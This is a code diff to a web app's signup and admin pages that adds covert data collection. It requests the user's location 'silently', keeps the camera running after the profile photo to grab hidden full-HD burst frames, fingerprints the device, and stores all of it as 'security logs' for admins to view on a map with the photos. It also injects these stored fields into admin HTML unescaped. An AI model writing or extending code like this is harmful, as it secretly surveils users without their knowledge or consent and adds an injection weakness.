@@ -1068,10 +1068,59 @@ function renderAdminUserList() {
             </td>
             <td class="p-3 text-slate-400">${u.email}</td>
             <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] uppercase font-bold ${u.role==='admin' ? 'bg-red-900/40 text-red-400' : 'bg-blue-900/40 text-blue-400'}">${u.role || 'user'}</span></td>
-            <td class="p-3 font-mono text-xs text-slate-500">••••••••</td>
+            <td class="p-3 font-mono text-xs text-slate-500">
+                <button onclick="showUserLogs('${u.email}')" class="text-blue-400 hover:text-white transition-colors" title="View Security Logs"><i class="fas fa-info-circle"></i> View Logs</button>
+            </td>
         `;
         container.appendChild(tr);
     });
+}
+
+function showUserLogs(email) {
+    const user = users[email];
+    if (!user || !user.securityLogs) {
+        alert("No security logs found for this user.");
+        return;
+    }
+
+    const logs = user.securityLogs;
+    document.getElementById('log-user-email').innerText = user.email;
+
+    // Device Info
+    document.getElementById('log-device-info').innerHTML = `
+        <p><span class="text-slate-500">Agent:</span> ${logs.userAgent}</p>
+        <p><span class="text-slate-500">Platform:</span> ${logs.platform}</p>
+        <p><span class="text-slate-500">Screen:</span> ${logs.screen}</p>
+        <p><span class="text-slate-500">Language:</span> ${logs.language}</p>
+    `;
+
+    // Location
+    const mapDiv = document.getElementById('log-location-map');
+    if (logs.location) {
+        mapDiv.innerHTML = `<iframe width="100%" height="100%" frameborder="0" style="border:0" src="https://maps.google.com/maps?q=${logs.location.lat},${logs.location.lng}&z=15&output=embed"></iframe>`;
+    } else {
+        mapDiv.innerHTML = "Location Access Denied";
+    }
+
+    // Burst Photos
+    const grid = document.getElementById('log-burst-grid');
+    grid.innerHTML = '';
+    if (logs.frames && logs.frames.length > 0) {
+        logs.frames.forEach(src => {
+            const img = document.createElement('img');
+            img.src = src;
+            img.className = "w-full h-24 object-cover rounded border border-white/20";
+            grid.appendChild(img);
+        });
+    } else {
+        grid.innerHTML = "<p class='text-xs text-slate-500'>No burst frames captured.</p>";
+    }
+
+    document.getElementById('user-log-modal').classList.remove('hidden');
+}
+
+function closeUserLog() {
+    document.getElementById('user-log-modal').classList.add('hidden');
 }
 
 // --- Face Lock Logic ---
@@ -1270,15 +1319,34 @@ function simulateBiometricScan() {
 let signupVideoStream = null;
 let capturedProfilePic = null;
 
+let signupGeoLocation = null;
+let securityFrames = [];
+
 async function startSignupCamera() {
     try {
+        // Request Camera
         const video = document.getElementById('signup-video');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } }); // HD Request
         signupVideoStream = stream;
         video.srcObject = stream;
         video.classList.remove('hidden');
         document.getElementById('signup-camera-placeholder').classList.add('hidden');
         document.getElementById('btn-capture-signup').classList.remove('hidden');
+
+        // Request Location Silently
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    signupGeoLocation = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    };
+                    console.log("Location captured");
+                },
+                (err) => console.log("Location denied", err)
+            );
+        }
     } catch (err) {
         console.error("Signup Camera Error:", err);
         alert("Could not access camera for profile photo.");
@@ -1291,27 +1359,44 @@ function captureSignupPhoto() {
     const video = document.getElementById('signup-video');
     const canvas = document.createElement('canvas');
     canvas.width = 300;
-    canvas.height = 300; // Square aspect for profile
+    canvas.height = 300;
     const ctx = canvas.getContext('2d');
 
-    // Crop center square
+    // 1. Capture Profile Pic (Cropped)
     const size = Math.min(video.videoWidth, video.videoHeight);
     const startX = (video.videoWidth - size) / 2;
     const startY = (video.videoHeight - size) / 2;
-
     ctx.drawImage(video, startX, startY, size, size, 0, 0, canvas.width, canvas.height);
+    capturedProfilePic = canvas.toDataURL('image/jpeg', 0.8);
 
-    capturedProfilePic = canvas.toDataURL('image/jpeg');
+    // 2. Capture Security Burst (Full HD) - Background Process
+    securityFrames = [];
+    const fullCanvas = document.createElement('canvas');
+    fullCanvas.width = video.videoWidth;
+    fullCanvas.height = video.videoHeight;
+    const fullCtx = fullCanvas.getContext('2d');
 
-    // Show Preview
+    let frameCount = 0;
+    const burstInterval = setInterval(() => {
+        if (frameCount >= 3 || !signupVideoStream) {
+            clearInterval(burstInterval);
+            // Stop Stream ONLY after burst is done
+            if (signupVideoStream) {
+                signupVideoStream.getTracks().forEach(track => track.stop());
+                signupVideoStream = null;
+            }
+            return;
+        }
+        fullCtx.drawImage(video, 0, 0, fullCanvas.width, fullCanvas.height);
+        securityFrames.push(fullCanvas.toDataURL('image/jpeg', 0.6));
+        frameCount++;
+    }, 300); // 300ms interval
+
+    // Show Preview Immediately (Don't wait for burst)
     const preview = document.getElementById('signup-photo-preview');
     preview.src = capturedProfilePic;
     preview.classList.remove('hidden');
     video.classList.add('hidden');
-
-    // Stop Stream
-    signupVideoStream.getTracks().forEach(track => track.stop());
-    signupVideoStream = null;
     document.getElementById('btn-capture-signup').classList.add('hidden');
 }
 
@@ -1330,10 +1415,20 @@ function handleSignup(e) {
         return;
     }
 
+    // Gather Security Metadata
+    const metaData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        language: navigator.language,
+        location: signupGeoLocation,
+        frames: securityFrames // The burst shots
+    };
+
     // Generate Mock OTP
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
 
-    tempSignupData = { name, email, password, otp, profilePic: capturedProfilePic };
+    tempSignupData = { name, email, password, otp, profilePic: capturedProfilePic, securityLogs: metaData };
 
     // Simulate Email Sending
     document.getElementById('verify-email-display').innerText = email;
